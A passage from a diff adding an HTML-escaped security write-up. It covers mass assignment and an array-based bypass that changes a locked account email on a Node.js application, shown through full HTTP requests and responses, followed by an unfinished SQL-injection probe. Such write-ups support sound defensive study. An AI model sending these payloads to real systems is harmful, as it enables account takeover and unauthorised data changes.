+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;John Doe&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;email&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;[value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;johndoe@example.com](mailto:value=%22johndoe@example.com)&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;admin&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Unintended field --&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Update&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In this example, the attacker has added a hidden input field named “admin” with the value set to “true.” When the form is submitted, the framework blindly assigns the value “true” to the “admin” field in the user model, even though it was not intended to be modifiable by the user. This can grant the attacker administrative privileges or other unauthorized access.&lt;/p&gt;
+
+&lt;h2 id=&quot;target-background&quot;&gt;Target Background&lt;/h2&gt;
+
+&lt;p&gt;The web application is developed using the Node.js framework. It incorporates dynamic roles, allowing the creation and assignment of new roles to users based on business requirements. The application is mostly used for financial purposes.&lt;/p&gt;
+
+&lt;h2 id=&quot;technology-stack&quot;&gt;Technology Stack&lt;/h2&gt;
+
+&lt;p&gt;The technology stack used in the Target application includes the following components:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Bootstrap&lt;/li&gt;
+  &lt;li&gt;Express&lt;/li&gt;
+  &lt;li&gt;Node.js&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;crud-operation&quot;&gt;CRUD Operation&lt;/h2&gt;
+
+&lt;p&gt;CRUD refers to Create, Read, Update, and Delete operations, which are fundamental to managing data in both database systems and web applications. Each letter in the acronym represents a specific operation.&lt;/p&gt;
+
+&lt;h3 id=&quot;exploiting-mass-assignment-vulnerability&quot;&gt;Exploiting Mass Assignment Vulnerability&lt;/h3&gt;
+
+&lt;p&gt;The Target application provides a feature that allows users to update their profiles with various details. However, changing the email address is restricted since users sign up using their email addresses.&lt;/p&gt;
+
+&lt;h3 id=&quot;request&quot;&gt;Request&lt;/h3&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/editUser&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;abc.com&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;blah....blah...&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/json, text/plain, */*&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en-US,en;q=0.5&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/json&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Csrf-Token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;csrf_token_value&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Referer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://abc.com/dashboard&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;534&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Origin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://abc.com&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;empty&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cors&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Site&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;same-origin&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Te&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;trailers&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;user_Id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2abaac0a-4af8-4101-a763-9d0229cafb12&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;email&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;naveenj@thevillagehacker.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;Mobile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;9874563217&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;role&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Analyst&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;isActive&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The above request demonstrates that the application allows users to update their details, including email. However, the user interface disables the edit email field.&lt;/p&gt;
+
+&lt;h3 id=&quot;response&quot;&gt;Response&lt;/h3&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;OK &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Access-Control-Allow-Origin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;* &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/json; charset=utf-8 &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Set-Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;blah...blah...blah...; Path=/; HttpOnly &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Frame-Options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;SAMEORIGIN &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Content-Type-Options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nosniff &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-XSS-Protection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1; mode=block &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Referrer-Policy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;strict-origin-when-cross-origin &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Strict-Transport-Security&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;max-age=31536000; includeSubDomains&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;Success&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;Message&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;User details Updated&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The server responds with a 200 OK status code and a success message indicating that the user’s details have been successfully updated.&lt;/p&gt;
+
+&lt;h3 id=&quot;bypassing-the-security-measures&quot;&gt;Bypassing the Security Measures&lt;/h3&gt;
+
+&lt;p&gt;Changing the existing email value in the request results in an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invalid Request Data&lt;/code&gt; error response. However, this protection can be bypassed by passing the email as an array.&lt;/p&gt;
+
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;user_Id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2abaac0a-4af8-4101-a763-9d0229cafb12&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;email&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;naveenj@thevillagehacker.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;attacker@thevillagehacker.com&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;Mobile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;9874563217&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;role&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Analyst&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;isActive&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After sending the above request, the server responds with a “200 OK” status code and a success message, indicating that the user details have been updated.&lt;/p&gt;
+
+&lt;h3 id=&quot;get-user_detail&quot;&gt;GET /user_detail&lt;/h3&gt;
+
+&lt;p&gt;To retrieve the current user’s details, a GET request to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/user_detail&lt;/code&gt; is made.&lt;/p&gt;
+
+&lt;h3 id=&quot;request-1&quot;&gt;Request&lt;/h3&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/user_detail&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;abc.com&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;blah....blah...&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/json, text/plain, */*&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en-US,en;q=0.5&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Csrf-Token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;csrf_token_value&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Referer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://abc.com/dashboard&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;empty&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cors&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Site&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;same-origin&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Te&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;trailers&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;response-1&quot;&gt;Response&lt;/h3&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;OK &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Access-Control-Allow-Origin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;* &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/json; charset=utf-8 &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Set-Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;blah...blah...blah...; Path=/; HttpOnly &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Frame-Options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;SAMEORIGIN &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Content-Type-Options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nosniff &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-XSS-Protection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1; mode=block &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Referrer-Policy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;strict-origin-when-cross-origin &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Strict-Transport-Security&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;max-age=31536000; includeSubDomains&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;user_Id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2abaac0a-4af8-4101-a763-9d0229cafb12&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;email&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;attacker@thevillagehacker.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;Mobile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;9874563217&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;role&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Analyst&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;isActive&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The response contains the user’s details, including the updated email address.&lt;/p&gt;
+
+&lt;h3 id=&quot;sql-injection&quot;&gt;SQL Injection&lt;/h3&gt;
+
+&lt;p&gt;Attempts to exploit SQL injection vulnerabilities on the application were unsuccessful. However, this new array method shows potential for further exploration.&lt;/p&gt;
+
+&lt;p&gt;When special characters and spaces are added as input in the array, the server responds with a SQL syntax error.&lt;/p&gt;
+
+&lt;h3 id=&quot;request-2&quot;&gt;Request&lt;/h3&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/editUser&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;abc.com&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;blah....blah...&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/json, text/plain, */*&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en-US,en;q=0.5&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/json&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Csrf-Token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;csrf_token_value&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Referer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://abc.com/dashboard&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;534&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Origin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://abc.com&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;empty&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cors&lt;/span&gt;
